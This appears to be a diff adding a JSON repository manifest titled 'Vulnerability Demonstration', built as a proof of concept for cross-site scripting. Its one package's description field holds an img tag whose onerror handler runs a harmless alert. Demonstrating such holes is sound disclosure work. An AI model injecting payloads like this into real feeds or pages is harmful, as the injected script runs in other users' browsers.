@@ -1,0 +1,25 @@
+{
+    "repoName": "Vulnerability Demonstration",
+    "repoID": "aospwn",
+    "repoAliases": ["vulnerability"],
+    "repoVersion": "1.0",
+    "packages": {
+        "you_looked": {
+            "packageName": "Whoopsie :)",
+            "packageID": "you_looked",
+            "packageAliases": ["oops"],
+            "version": "1.0",
+            "packageType": "webApp",
+            "installURL": "https://yourwebsite.com/myWebApp/package.json",
+            "icon": {
+                "foreground": "https://yourwebsite.com/myWebApp/repoIcon.png",
+                "backgroundColor": "#303947",
+                "backgroundBorder": {
+                    "thickness": 2,
+                    "color": "#252F3A"
+                }
+            },
+            "description": "<img src='lol' onerror='alert(\"failure\");'>"
+        }
+    }
+}
